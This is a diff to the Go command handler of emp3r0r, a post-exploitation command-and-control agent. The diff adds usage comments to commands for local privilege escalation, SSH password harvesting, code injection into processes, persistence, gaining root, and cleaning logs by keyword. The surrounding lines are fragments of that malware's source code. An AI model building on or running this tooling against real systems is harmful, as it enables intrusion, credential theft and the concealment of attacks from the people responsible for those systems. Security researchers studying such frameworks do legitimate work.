@@ -24,8 +24,8 @@ func platformC2CommandsHandler(cmdSlice []string) (out string) {
 	switch cmdSlice[0] {
 
 	case emp3r0r_data.C2CmdLPE:
-		// LPE helper
-		// !lpe --script_name script_name
+		// Usage: !lpe --script_name <script_name>
+		// Runs a Local Privilege Escalation (LPE) script.
 		scriptName := flags.StringP("script_name", "s", "", "Script name")
 		flags.Parse(cmdSlice[1:])
 		if *scriptName == "" {
@@ -37,6 +37,8 @@ func platformC2CommandsHandler(cmdSlice []string) (out string) {
 		return
 
 	case emp3r0r_data.C2CmdSSHHarvester:
+		// Usage: !ssh_harvester
+		// Starts monitoring SSH connections and logs passwords.
 		passfile := fmt.Sprintf("%s/%s.txt",
 			RuntimeConfig.AgentRoot, util.RandStr(10))
 		out = fmt.Sprintf("Look for passwords in %s", passfile)
@@ -45,6 +47,8 @@ func platformC2CommandsHandler(cmdSlice []string) (out string) {
 
 	// !inject --method method --pid pid
 	case emp3r0r_data.C2CmdInject:
+		// Usage: !inject --method <method> --pid <pid>
+		// Injects code into the specified process using the specified method.
 		method := flags.StringP("method", "m", "", "Injection method")
 		pid := flags.StringP("pid", "p", "", "Process ID")
 		flags.Parse(cmdSlice[1:])
@@ -65,6 +69,8 @@ func platformC2CommandsHandler(cmdSlice []string) (out string) {
 
 	// !persistence --method method
 	case emp3r0r_data.C2CmdPersistence:
+		// Usage: !persistence --method <method>
+		// Sets up persistence using the specified method.
 		method := flags.StringP("method", "m", "", "Persistence method")
 		flags.Parse(cmdSlice[1:])
 		if *method == "" {
@@ -93,6 +99,8 @@ func platformC2CommandsHandler(cmdSlice []string) (out string) {
 
 	// !get_root
 	case emp3r0r_data.C2CmdGetRoot:
+		// Usage: !get_root
+		// Attempts to gain root privileges.
 		if os.Geteuid() == 0 {
 			out = "Warning: You already have root!"
 		} else {
@@ -106,6 +114,8 @@ func platformC2CommandsHandler(cmdSlice []string) (out string) {
 
 	// !clean_log --keyword keyword
 	case emp3r0r_data.C2CmdCleanLog:
+		// Usage: !clean_log --keyword <keyword>
+		// Cleans logs containing the specified keyword.
 		keyword := flags.StringP("keyword", "k", "", "Keyword to clean logs")
 		flags.Parse(cmdSlice[1:])
 		if *keyword == "" {
